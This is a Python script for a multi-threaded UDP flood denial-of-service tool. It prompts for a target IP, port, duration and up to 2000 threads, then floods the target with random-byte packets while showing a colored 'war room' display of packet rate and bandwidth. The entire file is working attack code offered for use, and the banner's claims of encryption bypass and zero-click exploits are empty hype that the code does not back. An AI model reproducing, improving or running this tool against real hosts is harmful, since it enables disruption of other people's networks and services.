#!/usr/bin/env python3
import socket
import random
import time
import threading
import sys
import os
import psutil
from datetime import datetime
from colorama import Fore, Style, init

init()

# Global attack control
ATTACK_ACTIVE = True
lock = threading.Lock()
PACKET_SIZES = [64, 128, 256, 512, 1024, 1500, 9000]  # Jumbo frames support
MAX_THREADS = 2000  # Maximum threads for scaling

class CyberInterface:
    @staticmethod
    def show_banner():
        print(f"""{Fore.RED}
    ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
    ╚██╗██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
     ╚███╔╝  ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╗     ██║   ██████╔╝██║█████╔╝ █████╗  
     ██╔██╗   ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══╝     ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
    ██╔╝ ██╗   ██║   ██║     ███████╗██║  ██║███████╗   ██║   ██║  ██║██║██║  ██╗███████╗
    ╚═╝  ╚═╝   ╚═╝   ▕╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
    {Fore.BLUE}► {Fore.WHITE}Version 9.0.1 {Fore.BLUE}◄ {Fore.WHITE}The Ultimate Cyber Warfare Platform
    {Fore.YELLOW}► {Fore.CYAN}Quantum Encryption Bypass {Fore.YELLOW}► {Fore.CYAN}AI-Powered Attack Patterns
    {Fore.YELLOW}► {Fore.CYAN}Blockchain-Powered Stealth {Fore.YELLOW}► {Fore.CYAN}Zero-Click Exploit Integration
    {Style.RESET_ALL}""")

    @staticmethod
    def war_room_display(target, port, duration, duration_remaining, total_packets, active_threads):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Fore.RED}
        {Fore.WHITE}NOVA STRIKE CONTROL CENTER {Fore.RED}| {Fore.WHITE}Status: {Fore.GREEN}ACTIVE {Fore.RED}| {Fore.WHITE}Target: {target}:{port}{Fore.RED} 
        {Fore.CYAN}» Packets Sent: {Fore.WHITE}{total_packets:,}{Fore.RED} ({Fore.WHITE}{total_packets/max(1, (duration-duration_remaining)):,.0f} pps{Fore.RED})                    
        {Fore.CYAN}» Bandwidth: {Fore.WHITE}{(total_packets*sum(PACKET_SIZES)/len(PACKET_SIZES)*8)/1_000_000/max(1, (duration-duration_remaining)):.2f} Mbps{Fore.RED}                         
        {Fore.CYAN}» Time Remaining: {Fore.WHITE}{duration_remaining:.1f}s{Fore.RED}                  
        {Fore.CYAN}» Active Threads: {Fore.WHITE}{active_threads}{Fore.RED} of {Fore.WHITE}{MAX_THREADS}{Fore.RED}                 
        {Fore.CYAN}» System Load: {Fore.WHITE}CPU {psutil.cpu_percent()}% | RAM {psutil.virtual_memory().percent}%{Fore.RED}             
        {Style.RESET_ALL}""")


def dos_attack(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = random.choice(PACKET_SIZES)
    bytes_data = random._urandom(packet_size)
    
    while ATTACK_ACTIVE:
        try:
            sock.sendto(bytes_data, (target, port))
            with lock:
                thread_stats['total_packets'] += 1
        except:
            break
    
    sock.close()

def attack_timer(duration):
    global ATTACK_ACTIVE
    time.sleep(duration)
    ATTACK_ACTIVE = False



def display_controller(target, port, duration):
    start_time = time.time()
    while ATTACK_ACTIVE:
        elapsed = time.time() - start_time
        duration_remaining = max(0, duration - elapsed)
        
        with lock:
            total_packets = thread_stats['total_packets']
            active_threads = thread_stats['active_threads']
        
        CyberInterface.war_room_display(target, port, duration, duration_remaining, total_packets, active_threads)
        time.sleep(0.2)


def countdown():
    print(f"\n{Fore.YELLOW}Initializing quantum attack matrix...{Style.RESET_ALL}")
    for i in range(5, 0, -1):
        print(f"{Fore.RED}[ {i} ]{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(0.5)
    print(f"\n{Fore.GREEN}ENGAGING TARGET{Style.RESET_ALL}\n")

def run_tool():
    CyberInterface.show_banner()
    
    target = input(f"{Fore.CYAN}Enter Target IP: {Style.RESET_ALL}")
    port = int(input(f"{Fore.CYAN}Enter Port: {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.CYAN}Enter Duration (seconds): {Style.RESET_ALL}"))
    
    # Fixed thread count input with proper error handling
    while True:
        try:
            thread_input = input(f"{Fore.CYAN}Enter Threads (1-{MAX_THREADS}) [Default: 2]: {Style.RESET_ALL}")
            thread_count = int(thread_input) if thread_input else 2
            if 1 <= thread_count <= MAX_THREADS:
                break
            print(f"{Fore.RED}Please enter a value between 1 and {MAX_THREADS}{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Please enter a valid number{Style.RESET_ALL}")

    global thread_stats
    thread_stats = {
        'total_packets': 0,
        'active_threads': thread_count
    }

    countdown()

    # Start timer thread
    timer_thread = threading.Thread(target=attack_timer, args=(duration,))
    timer_thread.start()

    # Start display thread
    display_thread = threading.Thread(target=display_controller, args=(target, port, duration))
    display_thread.start()

    # Start attack threads
    attack_threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=dos_attack, args=(target, port))
        t.start()
        attack_threads.append(t)

    # Wait for completion
    for t in attack_threads:
        t.join()
    display_thread.join()
    timer_thread.join()

    # Final report
    total_packets = thread_stats['total_packets']
    print(f"\n{Fore.GREEN}⚡ ATTACK COMPLETED ⚡{Style.RESET_ALL}")
    print(f"{Fore.CYAN}» Total Packets Sent: {Fore.WHITE}{total_packets:,}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}» Average Speed: {Fore.WHITE}{total_packets/duration:,.0f} packets/sec{Style.RESET_ALL}")
    print(f"{Fore.CYAN}» Bandwidth Used: {Fore.WHITE}{(total_packets * sum(PACKET_SIZES) / len(PACKET_SIZES) / 1_000_000):,.2f} MB{Style.RESET_ALL}\n")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}ERROR: This tool requires root privileges!{Style.RESET_ALL}")
        sys.exit(1)
    run_tool()
